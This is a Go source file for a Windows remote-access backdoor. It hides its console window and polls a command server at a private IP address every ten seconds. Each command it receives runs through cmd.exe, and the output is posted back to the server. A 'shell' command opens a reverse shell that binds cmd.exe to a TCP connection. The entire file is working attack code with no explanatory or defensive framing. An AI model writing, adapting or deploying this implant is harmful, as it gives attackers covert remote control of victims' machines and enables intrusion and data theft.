package main

import (
    "bytes"
    "encoding/json"
    "fmt"
    "io/ioutil"
    "net"
    "net/http"
    "os/exec"
    "strings"
    "sync"
    "syscall"
    "time"
)

var (
    mu               sync.Mutex
    isCommandRunning bool
    serverURL        = "http://192.168.56.101:5000"
)

type Command struct {
    ID  string `json:"id"`
    Cmd string `json:"cmd"`
}

type CommandResult struct {
    ID     string `json:"id"`
    Result string `json:"result"`
}

func fetchCommand() (Command, error) {
    var cmd Command
    resp, err := http.Get(fmt.Sprintf("%s/command", serverURL))
    if err != nil {
        return cmd, err
    }
    defer resp.Body.Close()
    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        return cmd, err
    }
    err = json.Unmarshal(body, &cmd)
    return cmd, err
}

func sendResult(result CommandResult) {
    jsonData, err := json.Marshal(result)
    if err != nil {
        fmt.Printf("Error marshalling result: %v\n", err)
        return
    }

    _, err = http.Post(fmt.Sprintf("%s/submit_result", serverURL), "application/json", bytes.NewBuffer(jsonData))
    if err != nil {
        fmt.Printf("Failed to send result: %v\n", err)
    }
}

func executeCommandAndSendResult(cmd Command) {
    if strings.HasPrefix(cmd.Cmd, "shell ") {
        address := strings.TrimSpace(strings.TrimPrefix(cmd.Cmd, "shell"))
        if address != "" {
            openReverseShell(address) // Pass the extracted address to openReverseShell
        } else {
            fmt.Println("No address specified for shell command")
        }
    } else {
        // Example of executing a non-shell command
        output, err := exec.Command("cmd", "/C", cmd.Cmd).CombinedOutput()
        resultText := string(output)
        if err != nil {
            resultText += "\nError: " + err.Error()
        }
        result := CommandResult{
            ID:     cmd.ID,
            Result: resultText,
        }
        sendResult(result)
    }
}

func openReverseShell(address string) {
    conn, err := net.Dial("tcp", address)
    if err != nil {
        fmt.Printf("Failed to open reverse shell to %s: %v\n", address, err)
        return
    }
    defer conn.Close()

    cmd := exec.Command("cmd.exe")
    cmd.Stdin, cmd.Stdout, cmd.Stderr = conn, conn, conn
    if err := cmd.Run(); err != nil {
        fmt.Printf("Failed to run shell command: %v\n", err)
    }
}

func main() {
    hideConsoleWindow()
    fmt.Println("Application started. Waiting for commands...")
    ticker := time.NewTicker(10 * time.Second)

    go func() {
        for range ticker.C {
            mu.Lock()
            if !isCommandRunning {
                isCommandRunning = true
                mu.Unlock()

                cmd, err := fetchCommand()
                if err != nil {
                    fmt.Printf("Error fetching command: %s\n", err)
                    continue
                }
                if cmd.ID != "" {
                    executeCommandAndSendResult(cmd)
                }

                mu.Lock()
                isCommandRunning = false
            }
            mu.Unlock()
        }
    }()

    select {} // Prevent the application from exiting immediately
}

var kernel32 = syscall.NewLazyDLL("kernel32.dll")
var user32 = syscall.NewLazyDLL("user32.dll")

var (
    procGetConsoleWindow = kernel32.NewProc("GetConsoleWindow")
    procShowWindow       = user32.NewProc("ShowWindow")
)

func hideConsoleWindow() {
    consoleWindow, _, _ := procGetConsoleWindow.Call()
    if consoleWindow == 0 {
        return // No console window attached
    }
    procShowWindow.Call(consoleWindow, 0) // SW_HIDE = 0
}
